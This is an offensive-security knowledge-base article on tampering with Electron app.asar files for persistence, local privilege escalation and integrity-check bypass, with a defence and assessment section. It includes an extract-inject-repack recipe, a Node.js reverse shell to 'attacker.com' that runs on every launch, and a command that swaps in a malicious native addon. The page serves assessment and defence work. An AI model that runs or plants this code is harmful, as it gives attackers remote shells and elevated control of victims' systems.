---
title: ASAR Tampering
description: Modifying Electron's app.asar to inject malicious code — persistence, LPE, and supply chain attacks
---

# ASAR Tampering

ASAR tampering is one of those bugs that sounds boring on paper — "you need local file write access" — until you realize what apps run with elevated privileges, how often ASAR files have world-writable permissions, or how easy it is to drop a backdoor in an app that runs as SYSTEM on every Windows machine in an enterprise.

The technique itself is trivial. The impact depends on what the app can do.

---

## Why ASAR Is Easy to Modify

- It's a flat archive with a JSON header — no encryption, no signing
- The `asar` CLI tool extracts and repacks in two commands
- Most apps don't enable ASAR integrity validation (the fuse is disabled by default)
- The file is installed in a user-accessible location on most platforms
- No authentication or bypass is needed — just write access to the file

---

## The Basic Attack

```bash
# 1. Find the ASAR:
# macOS:   /Applications/Target.app/Contents/Resources/app.asar
# Windows: C:\Program Files\Target\resources\app.asar
# Linux:   /opt/target/resources/app.asar

# 2. Back up (so you can restore later):
cp app.asar app.asar.bak

# 3. Extract:
asar extract app.asar /tmp/target-app/

# 4. Inject into the main process entry point:
cat >> /tmp/target-app/main.js << 'EOF'
const { exec } = require('child_process');
exec('your payload here');
EOF

# 5. Repack:
asar pack /tmp/target-app/ app.asar

# 6. App launch: injected code runs
```

Two commands to extract. One line to inject. Two commands to repack. That's the entire technique. What matters is what happens when the code runs.

---

## Attack Scenarios

### Persistence

Brief physical access, brief remote code execution, anything that lets you write to the ASAR once is enough to establish a persistent foothold:

```javascript
// Injected into main.js — reverse shell on every app launch:
const net = require('net');
const cp = require('child_process');
const client = net.createConnection(4444, 'attacker.com');
const sh = cp.spawn('/bin/sh', ['-i']);
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
```

Every time the user opens the app, the shell opens. If the app is in startup items or runs in the system tray, that's every login.

### Local Privilege Escalation

This is where ASAR tampering becomes a real bug bounty finding. Many desktop apps with system-level capabilities — antivirus software, backup agents, system monitoring tools, update managers — run with elevated privileges. If the ASAR file has write permissions for the current user:

```bash
# Check who can write the ASAR:
ls -la /Applications/Target.app/Contents/Resources/app.asar
# "writable by everyone" or current user writable → LPE if app runs elevated

# Windows:
icacls "C:\Program Files\Target\resources\app.asar"
# If BUILTIN\Users has (W) → LPE
```

Standard user writes to the ASAR, injected code runs as SYSTEM or root. No exploit, no vulnerability in the app logic — just bad file permissions and the absence of integrity checking.

This is the pattern behind the Backblaze LPE and many similar findings. The vulnerability isn't flashy but the impact is real.

---

## Bypassing ASAR Integrity (When It's Enabled)

Apps that do have the integrity fuse enabled aren't fully protected. Two reliable bypasses:

### Bypass 1: app.asar.unpacked/

Some files are placed outside the ASAR in `app.asar.unpacked/` — native addons, large binaries, external libraries. These are *never* covered by ASAR integrity validation:

```
resources/
├── app.asar                    ← integrity checked (if fuse enabled)
└── app.asar.unpacked/
    ├── native_module.node      ← NOT integrity checked
    └── ffmpeg.dll              ← NOT integrity checked
```

Native `.node` addons run completely outside the V8 sandbox. Replacing one is equivalent to arbitrary code execution, and the integrity check never catches it:

```bash
# Check what's unpacked (these bypass integrity):
ls /Applications/Target.app/Contents/Resources/app.asar.unpacked/

# Replace with a malicious native addon:
cp malicious_payload.node /path/to/app.asar.unpacked/native_module.node
```

### Bypass 2: V8 Snapshots (CVE-2025-55305)

V8 snapshot blobs are loaded *before* ASAR integrity validation runs. An attacker who replaces `snapshot_blob.bin` executes pre-compiled JavaScript that bypasses the integrity check entirely. See [V8 Snapshots](v8-snapshots.md).

---

## What Proper Defense Looks Like

Both fuses must be enabled:

1. `EnableEmbeddedAsarIntegrityValidation: true` — validates the ASAR hash
2. `OnlyLoadAppFromAsar: true` — prevents the directory fallback

Even with both enabled, unpacked files and V8 snapshots remain unprotected. Comprehensive protection requires also:
- Correct file permissions (only the installing user/service account can write)
- Junction/symlink attack prevention on Windows
- Validating the unpacked directory as well (not currently done by Electron automatically)

---

## Finding This During an Assessment

```bash
# Check fuse state:
npx @electron/fuses read --app /path/to/app | grep -E "AsarIntegrity|OnlyLoad"

# Check permissions on the ASAR:
ls -la /path/to/app/resources/app.asar    # Unix
icacls "C:\path\to\app\resources\app.asar"  # Windows

# Check if the app runs elevated:
# macOS: check entitlements
codesign -d --entitlements - /Applications/Target.app
# Look for: com.apple.security.cs.allow-jit, keychain entitlements

# Windows: check manifest
# Right-click exe → Properties → Compatibility or use strings on the binary
strings Target.exe | grep -i "requireAdministrator\|highestAvailable"
```

ASAR tampering without elevated app privileges is typically Medium (P3) — local write access required, limited blast radius. With an app running as admin/root and world-writable ASAR permissions, it's a clean LPE chain and a High (P2) or Critical (P1) finding.
